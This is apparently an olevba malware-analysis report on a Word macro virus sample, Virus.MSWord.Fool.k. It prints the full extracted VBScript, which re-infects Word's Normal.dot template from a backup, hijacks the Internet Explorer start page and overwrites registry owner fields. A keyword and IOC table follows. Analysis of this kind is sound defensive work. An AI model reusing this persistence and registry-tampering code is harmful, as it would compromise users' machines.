olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fool.k-fed25ca15ed9ae7cc98de3f31ed22de687f53a96
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Fool.k-fed25ca15ed9ae7cc98de3f31ed22de687f53a96 
in file: Virus.MSWord.Fool.k-fed25ca15ed9ae7cc98de3f31ed22de687f53a96 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' WalruS.vbs for SuperNova by The WalruS
On Error Resume Next
Welcome_MsgBox_Message_Text   = " Wally The WalruS Thanx Ya"
Welcome_MsgBox_Title_Text = "SuperNova"
If Day(Now) = 1 Then Call Payload
Call Backup
Call Regedit
Sub Backup()
Dim fso, template
Set fso = CreateObject("Scripting.FileSystemObject")
If (fso.FileExists("C:\Windows\System\Backup\Normal.bak")) Then
Call ReInfect
Else
Set template = fso.GetFile("C:\Windows\Application Data\Microsoft\Templates\Normal.dot")
template.Copy ("C:\Windows\System\Backup\Normal.bak")
End If
End Sub
Sub ReInfect()
Dim fso, newtemp
Set fso = CreateObject("Scripting.FileSystemObject")
Set newtemp = fso.GetFile("C:\Windows\System\Backup\Normal.bak")
newtemp.Copy("C:\Windows\Application Data\Microsoft\Templates\Normal.dot")
End Sub
Sub Regedit()
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "www.walrus.8k.com"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "The WalruS"
WSHShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOrganization", "SuperNova"  
End Sub
Sub Payload()
Dim intDoIt
intDoIt = MsgBox(Welcome_MsgBox_Message_Text,    _ 
vbOKCancel + vbInformation,       _
Welcome_MsgBox_Title_Text )
If intDoIt = vbCancel Then
WScript.Quit
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |WalruS.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

